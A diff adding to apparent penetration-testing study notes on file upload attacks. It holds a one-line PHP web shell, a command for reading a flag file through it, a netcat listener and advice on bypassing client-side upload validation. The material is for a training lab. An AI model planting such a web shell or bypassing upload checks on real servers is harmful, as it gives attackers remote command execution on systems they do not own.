@@ -19,3 +19,13 @@
 NetCat listener: `nc -lvnp OUR_PORT` (where OUR_PORT is any free port)
 - While reverse shells are always preferred over web shells, as they provide the most interactive method for controlling the compromised server, they may not always work, and we may have to rely on web shells instead.
 - Webshell is CLI in browser, where reverse shell is in terminal.
+
+Upload Exploitation Commands - Get Webshell
+- Make PHP file `<?php system($_REQUEST['cmd']); ?>`
+- Then add `?cmd=cat /flag.txt` to the end of the URL to get flag
+
+Any code that runs on the client-side is under our control. While the web server is responsible for sending the front-end code, the rendering and execution of the front-end code happen within our browser. If the web application does not apply any of these validations on the back-end, we should be able to upload any file type.
+
+To bypass these protections, we can either modify the upload request to the back-end server, or we can manipulate the front-end code to disable these type validations.
+
+- We may also modify the Content-Type of the uploaded file, though this should not play an important role at this stage, so we'll keep it unmodified.
